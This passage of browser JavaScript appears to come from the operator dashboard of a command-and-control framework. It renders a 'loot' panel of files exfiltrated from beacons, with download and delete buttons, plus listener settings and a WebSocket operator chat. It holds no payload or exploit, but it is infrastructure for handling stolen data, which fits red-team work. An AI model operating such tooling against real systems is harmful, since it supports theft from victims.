    evBody.style.display   = tab === 'events' ? '' : 'none';
    lootBody.style.display = tab === 'loot'   ? '' : 'none';
    if (chatBody) chatBody.style.display = tab === 'chat' ? '' : 'none';

    document.querySelectorAll('.event-log-tab').forEach(el => {
        el.classList.toggle('active', el.dataset.tab === tab);
    });

    const exportBtn = document.getElementById('export-log-btn');
    if (exportBtn) exportBtn.style.display = tab === 'events' ? '' : 'none';

    if (tab === 'chat') {
        clearChatUnread();
        const input = document.getElementById('chat-input');
        if (input) input.focus();
        const msgs = document.getElementById('chat-messages');
        if (msgs) msgs.scrollTop = msgs.scrollHeight;
    }
}

// ---- Loot panel ----

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const units = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
}

let _lootSignature = '';

async function loadLootPanel() {
    const tsUrl = getTsUrl();
    const body = document.getElementById('loot-log-body');
    if (!body) return;
    if (!tsUrl) return;

    try {
        const resp = await authFetch(tsUrl + '/api/loot');
        if (!resp.ok) return;
        const files = await resp.json();

        if (!files || files.length === 0) {
            if (_lootSignature !== 'empty') {
                body.innerHTML = '<div class="event-log-empty">no loot yet&hellip; Download something from a beacon</div>';
                _lootSignature = 'empty';
            }
            return;
        }

        files.sort((a, b) => new Date(b.exfil_at) - new Date(a.exfil_at));

        const sig = files.map(f => f.label).join(',');
        if (sig === _lootSignature) return;
        _lootSignature = sig;

        body.innerHTML = '';
        files.forEach(f => {
            const d = new Date(f.exfil_at);
            const ts = String(d.getHours()).padStart(2, '0') + ':' +
                       String(d.getMinutes()).padStart(2, '0') + ':' +
                       String(d.getSeconds()).padStart(2, '0');

            const entry = document.createElement('div');
            entry.className = 'event-log-entry loot-entry';
            entry.innerHTML =
                '<span class="event-log-ts">' + ts + '</span>' +
                '<span class="event-log-msg">' +
                    '<span class="ev-action-new">' + escapeHtml(f.filename) + '</span>' +
                    ' <span class="ev-user">#' + f.beacon_id + '</span>' +
                    ' <span style="color:var(--text-dim);opacity:0.5">' + formatBytes(f.size) + '</span>' +
                '</span>' +
                '<span class="loot-actions">' +
                    '<button class="loot-dl-btn" onclick="downloadLootEntry(' + f.label + ',\'' + escapeHtml(f.filename) + '\')" title="Download"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></button>' +
                    '<button class="loot-rm-btn" onclick="deleteLootEntry(' + f.label + ',this)" title="Delete"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg></button>' +
                '</span>';
            body.appendChild(entry);
        });
    } catch (_) {}
}

async function deleteLootEntry(label, btn) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        await authFetch(tsUrl + '/api/files/' + label, { method: 'DELETE' });
        if (btn) {
            const row = btn.closest('.loot-entry');
            if (row) row.remove();
        }
    } catch (_) {}
    loadLootPanel();
}

async function downloadLootEntry(label, filename) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await authFetch(tsUrl + '/api/files/' + label);
        if (!resp.ok) return;
        const blob = await resp.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch (_) {}
}

if (document.getElementById('listeners-tbody') !== null) {
    if (!checkAuth()) { /* redirecting to /login */ }
    else {
        initSettings();
        loadListeners();
        ['tsIp', 'tsPort'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.addEventListener('keydown', e => { if (e.key === 'Enter') saveSettings(); });
        });
    }
}

window.addEventListener('resize', () => { if (_currentView === 'map') loadSessions(); });

// ---- Operator chat ----

function _handleChatMsg(action, data) {
    if (action === 'sync') {
        renderChatHistory(data || []);
    } else if (action === 'add') {
        appendChatMessage(data);
        const currentTab = document.querySelector('.event-log-tab.active')?.dataset.tab;
        if (currentTab !== 'chat') {
            showChatUnread();
        }
    }
}

function renderChatHistory(msgs) {
    const box = document.getElementById('chat-messages');
    if (!box) return;
    box.innerHTML = '';
    msgs.forEach(appendChatMessage);
}

function appendChatMessage(m) {
    const box = document.getElementById('chat-messages');
    if (!box) return;

    const row = document.createElement('div');
    row.className = 'chat-msg';

    const ts = document.createElement('span');
    ts.className = 'chat-ts';
    ts.textContent = formatChatTimestamp(m.timestamp);

    const op = document.createElement('span');
    op.className = 'chat-op';
    op.textContent = (m.operator || '?');
    op.style.color = operatorColor(m.operator || '?');

    const msg = document.createElement('span');
    msg.className = 'chat-text';
    msg.textContent = m.message || '';

    row.appendChild(ts);
    row.appendChild(op);
    row.appendChild(msg);
    box.appendChild(row);

    box.scrollTop = box.scrollHeight;
}

function formatChatTimestamp(ts) {
    const d = new Date(ts);
    if (isNaN(d.getTime())) {
        return '[--:--:--]';
    }
    const hh = String(d.getHours()).padStart(2, '0');
    const mm = String(d.getMinutes()).padStart(2, '0');
    const ss = String(d.getSeconds()).padStart(2, '0');
    return `[${hh}:${mm}:${ss}]`;
}

function operatorColor(name) {
    let h = 5381;
    for (let i = 0; i < name.length; i++) {
        h = ((h << 5) + h + name.charCodeAt(i)) | 0;
    }
    const hue = Math.abs(h) % 360;
    return `hsl(${hue}, 70%, 65%)`;
}

function showChatUnread() {
    const dot = document.getElementById('chatUnreadDot');
    if (dot) dot.classList.add('has-unread');
}

function clearChatUnread() {
    const dot = document.getElementById('chatUnreadDot');
    if (dot) dot.classList.remove('has-unread');
}

function initChatForm() {
    const form = document.getElementById('chat-form');
    const input = document.getElementById('chat-input');
    if (!form || !input) return;

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        const text = input.value.trim();
        if (!text) return;
        if (!_operatorWs || _operatorWs.readyState !== WebSocket.OPEN) return;
        _operatorWs.send(JSON.stringify({
            topic: 'chat',
            action: 'send',
            data: { message: text },
        }));
        input.value = '';
    });
}

document.addEventListener('DOMContentLoaded', initChatForm);
